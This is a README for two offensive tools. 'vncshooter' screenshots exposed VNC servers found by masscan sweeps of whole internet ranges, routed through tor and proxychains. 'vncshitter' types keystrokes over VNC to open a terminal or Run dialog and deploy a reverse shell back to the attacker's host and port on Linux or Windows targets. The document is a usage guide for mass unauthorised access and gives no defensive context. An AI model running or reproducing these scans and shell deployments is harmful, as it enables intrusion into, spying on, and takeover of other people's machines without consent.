# vncshooter & vncshitter


**vncshooter** will parse a textfile containing target ip's, extract all ip's, attempt to connect to the target and take a screenshot. (requires tor, proxychains, vncsnapshot)

**vncshitter** can automatically place a reverse shell on a target, by sending keystrokes over a vnc connection (requires vncdotool)




use masscan to gather target ip's


    sudo masscan -p5900 85.0.0.0/8 --resume paused.conf --rate 10000 >> 85.output
    
    
    
use vncshooter to take screens
    
    
    ./vncshooter 85.output



use vncshitter to deploy a shell


    Usage: ./vncshitter --rhost=x.x.x.x [--rport=5900] [--lhost=x.x.x.x] [--rport=4444] [--platform=linux-gui]

    [rhost] = Remote ip (required)
    [rport] = Remote port (default: 5900)
    [lhost] = Local host to bind default shell to (default: your external ip)
    [lport] = Local port to bind default shell to (default: 4444)
    [platform] = (default: linux-gui)
                 linux-gui: will work on default ubuntu etc (using alt+ctrl+t -> terminal -> payload)
                 win: will work on win7+ (using windows_key+r -> run -> cmd -> payload)
